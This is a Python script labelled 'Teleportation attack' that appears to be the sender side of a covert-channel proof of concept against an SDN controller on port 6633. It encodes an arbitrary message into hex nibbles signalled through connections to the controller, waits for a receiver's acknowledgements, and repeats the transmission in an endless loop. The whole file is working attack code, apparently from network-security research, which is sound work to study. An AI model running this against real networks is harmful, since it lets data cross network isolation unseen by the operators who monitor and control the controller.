#!/usr/bin/python3
# Teleportation attack
# SENDER script
from common import *
from ipaddress import ip_address
import time, argparse


def main(controller, port, message):
    # Tell peer that transmission will start
    print('Sending Start-of-Transmission for 2 seconds.')
    start_time = time.time()
    s, start_transmission = secure_connect(controller, port, 0xEF)
    time.sleep(2)
    s.close()

    # Ensure that someone is listening, if not, we loop !
    timeout = 0
    while not test_value(controller, port, 0xDF):
        if timeout < 3:
            timeout += 0.250
            time.sleep(0.250)
        else:
            print('No listener detected, looping...')
            return None
    print('Listener is connected, start sending the message !')

    # Transmitting loop
    for i in range(len(message)):
        # Split the ASCII character in two hex values
        char_hex = message[i].encode()
        first_hex = int(hex(char_hex[0])[2:3], 16)
        second_hex = int(hex(char_hex[0])[3:4], 16)
        print(f'Sending ASCII char {message[i]} ({first_hex} + {second_hex})')

        for value in (first_hex, second_hex):
            s
            # Sending Hex one-by-one
            print('Sending ' + str(value))
            s, status = secure_connect(controller, port, value+1)
            time.sleep(0.250)
            # Wait for ACK from receiver
            while not test_value(controller, port, 0xDF):
                time.sleep(0.250)
            print('Value has been shipped, acknowledged by peer...')
            s.close()
    print('The full message has been sent !')

    # Tell peer that transmission is done, sending End-of-Transmission
    s, end_transmission = secure_connect(controller, port, 0xFF)
    time.sleep(5)
    s.close()

    print(f'End-of-Transmission sent, message "{message}" sent in {round(time.time()-start_time, 2)} seconds.')


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--controller", help="IPv4 address used by the remote controller, localhost by default.",
                        type=str, default='127.0.0.1')
    parser.add_argument("--port", help="Port used by the remote controller, 6633 by default.",
                        type=int, default=6633)
    parser.add_argument("--message", help="Message that will be sent to the receiver.",
                        type=str, required=True)
    args = parser.parse_args()
    # Few checks before we start ...
    # Does controller IP is valid ?
    try :
        controller_ip = ip_address(args.controller)
    except ValueError:
        print(f'{args.controller} is not a valid IP Address !')
        exit()
    # Does controller PORT is valid ?
    if not 1 <= args.port <= 65535:
        print(f'{args.port} is not a valid port, it need to be within the range 1-65535 !')
        exit()
    # Loop the transmission, receiver will start to listen when we send the first Start-of-Transmission
    while True:
        print('Sender script started...')
        main(args.controller, args.port, args.message)
        time.sleep(2)  # Wait two seconds between each loop
